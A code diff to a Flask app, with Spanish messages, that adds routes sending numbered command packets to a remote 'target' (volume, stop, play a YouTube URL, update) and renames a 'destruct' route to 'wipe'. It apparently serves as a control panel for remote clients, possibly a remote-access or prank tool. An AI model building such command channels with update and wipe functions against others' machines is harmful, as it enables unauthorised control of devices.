@@ -228,11 +228,37 @@ def tts():
     add_history("tts", {"txt": txt}, target)
     return jsonify({"ok": True, "target": target})
 
+@app.route("/api/vol", methods=["POST"])
+def vol():
+    val = (request.json or {}).get("val", "")
+    if not val:
+        return jsonify({"error": "Mensaje vacío"}), 400
+    target = send_packet({"type": 3, "vol": val})
+    return jsonify({"ok": True, "target": target})
 
-@app.route("/api/destruct", methods=["POST"])
-def destruct():
+@app.route("/api/stop", methods=["POST"])
+def stop():
+    target = send_packet({"type": 4})
+    return jsonify({"ok": True, "target": target})
+
+@app.route("/api/yt", methods=["POST"])
+def yt():
+    url = (request.json or {}).get("url", "").strip()
+    if not url:
+        return jsonify({"error": "URL vacía"}), 400
+    target = send_packet({"type": 5, "url": url})
+    add_history("audio", {"url": url}, target)
+    return jsonify({"ok": True, "target": target})
+
+@app.route("/api/update", methods=["POST"])
+def update():
+    target = send_packet({"type": 6})
+    return jsonify({"ok": True, "target": target})
+
+@app.route("/api/wipe", methods=["POST"])
+def wipe():
     target = send_packet({"type": 404})
-    add_history("destruct", {}, target)
+    add_history("wipe", {}, target)
     return jsonify({"ok": True, "target": target})
 
 
